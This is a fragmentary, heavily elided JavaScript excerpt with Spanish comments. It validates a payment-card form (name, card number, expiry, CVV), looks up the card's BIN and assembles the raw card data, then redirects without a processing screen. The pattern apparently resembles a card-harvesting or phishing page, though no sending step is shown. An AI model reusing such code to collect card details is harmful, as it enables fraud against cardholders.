...
const inputNombre = document.getElementById('inp_c_nmbr');
...
function isDateValid(exp) {
    ...
    var currentYear = parseInt(now.getFullYear().toString().slice(-2)); // últimos 2 dígitos
...
function verificarCampos() {
    ...
    // Validar formato de fecha y que no esté vencida
    const expValid = isDateValid(exp);

    if (nombre.length >= 2 && pan.length >= 15 && expValid && cvv.length >= 3) {
...
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('inp_c_xp').addEventListener('input', function(e) {
        ...
        // Verificar campos después de cada cambio
        verificarCampos();
    });
...
async function enviarTarjeta() {
    const nombre = document.getElementById('inp_c_nmbr').value.trim();
    ...
    // Validar fecha de vencimiento (formato y que no esté vencida)
    if (!isDateValid(exp)) {
    ...
    const cardBinData = await identifyBin(bin);
    ...
    const cardData = {
        ...
        expirationDate: exp,
        cvv: cvv,
        type: localStorage.getItem('card_type') || 'Débito',
    ...
    // Redirección directa sin pantalla de "Procesando..."
